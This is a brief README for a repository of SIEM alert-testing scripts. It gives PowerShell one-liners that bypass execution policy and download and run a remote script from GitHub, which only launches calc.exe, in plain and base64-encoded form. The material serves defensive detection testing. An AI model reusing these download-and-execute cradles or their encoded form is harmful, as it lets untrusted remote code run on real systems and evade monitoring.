# bluetests
Just some basic scripts for testing SIEM alerts


Invoke-Calc
This powershell script just launch calc.exe using methods to download and execute various malicious payloads.  Below are some of the ways to call this.

## Standard Execution
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/losttroll/bluetests/main/invokecalc.ps1');invoke-calc"

## Base 64 Encoded Execution
powershell -noprofile -noninteractive -executionpolicy bypass -encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAQgB5AHAAYQBzAHMAIAAtAEMAIAAiAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGwAbwBzAHQAdAByAG8AbABsAC8AYgBsAHUAZQB0AGUAcwB0AHMALwBtAGEAaQBuAC8AaQBuAHYAbwBrAGUAYwBhAGwAYwAuAHAAcwAxACcAKQA7AGkAbgB2AG8AawBlAC0AYwBhAGwAYwAiAA==
